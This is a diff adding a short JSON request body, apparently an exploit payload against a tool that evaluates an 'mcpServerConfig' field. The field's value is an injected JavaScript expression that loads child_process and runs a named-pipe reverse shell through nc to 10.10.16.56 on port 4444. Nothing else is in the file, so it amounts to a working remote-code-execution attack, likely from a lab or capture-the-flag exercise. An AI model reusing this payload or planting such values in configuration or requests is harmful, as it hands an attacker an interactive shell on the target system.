@@ -1,0 +1,6 @@
+{
+  "loadMethod": "listActions",
+  "inputs": {
+    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.56 4444 >/tmp/f');return 1;})()} )"
+  }
+}
